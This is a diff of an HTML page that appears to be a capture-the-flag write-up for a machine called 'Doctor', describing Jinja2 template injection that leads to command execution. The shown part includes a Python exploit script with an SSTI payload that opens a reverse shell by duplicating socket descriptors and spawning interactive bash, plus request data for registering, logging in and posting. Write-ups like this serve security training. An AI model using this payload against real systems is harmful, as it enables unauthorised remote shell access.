@@ -61,21 +61,31 @@ body {
 		&lt;title&gt;&lt;item&gt; &lt;/title&gt;&lt;/item&gt; 64&lt;/title&gt;&lt;/item&gt;
 	</code>														<br/> <br/><br/>
 
-	We can see the expected output, 64, on the archives page							<br/><br/>
+	We can see the expected output, 64, on the archives page							<br/> <br/>
 	<img src="images/doctor/inject2.PNG" alt="basic injection" class="inline"/>         				<br/> <br/> <br/>
 
-	As well as the expected source code after closing our tags							<br/><br/>
+	As well as the expected source code after closing our tags							<br/> <br/>
 	<img src="images/doctor/inject2-source.PNG" alt="basic injection" class="inline"/>         			<br/> <br/> <br/> <br/>
 
-	Further down the github link there is a popen() method where it appears we can run shell commands.		<br/><br/>
+	Further down the github link there is a popen() method where it appears we can run shell commands.		<br/> <br/>
 	<img src="images/doctor/jinja-popen.PNG" alt="popen example" class="inline"/>         				<br/> <br/> <br/>
 
 
-	I successfully attempted it with the /usr/bin/whoami command and got a response back as dev. My next step was to see if we can run bash. 		<br/> 
-	It turned out successful and we got the shell back. This was quite a pain to do manually, so I opted to create a python script. I first			<br/> 
-	configured the burp suite proxy, then I manually created a new user, created a post, and then requested the /archives page. I grabbed 			<br/> 
-	the headers/cookies that we will need for all 3 actions. I then started on the python script								<br/> <br/> <br/> 
+	At this point we have all we need to get a shell. I started creating a python script to easily do all this.	<br/><br/>
 	
+	<pre>
+	First step is to grab all of our headers/cookies on the 3 necessary requests
+		  - register new account
+		  - login to new account
+		  - create a new post
+		  - visit /archives
+	</pre>
+	<img src="images/doctor/burp-register-post.PNG" alt="register new account req" class="inline"/>         				<br/> <br/> <br/>
+	<img src="images/doctor/burp-login-post.PNG" alt="login to new account req" class="inline"/>         					<br/> <br/> <br/>
+	<img src="images/doctor/burp-post-comment.PNG" alt="create new comment req" class="inline"/>         					<br/> <br/> <br/><br/><br/>
+	
+	
+	I then started on the python script								</br>							
 	<pre>
 	The script will:
 		  #1 - generate a random string and register a new account under that string
@@ -125,7 +135,7 @@ body {
 	exploit += "os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);"
 	exploit += "p=subprocess.call([\\\"/bin/bash\\\", \\\"-i\\\"]);'\").read().zfill(417)}}{%endif%}{% endfor %}"
 
-	# the data for our 3 post requests, fields copied from burpsuite after manual tests
+	# the data for our 3 post requests, burpsuite 
 	reg_dict = { 'username': user, 'email': email, 'password': 'test', 'confirm_password': 'test', 'submit': 'Sign+Up'}
 	login_dict = { 'email': email, 'password': 'test', 'submit': 'Login'}
 	inject_dict = { 'title': exploit, 'content': 'Hello World', 'submit': 'Post' }
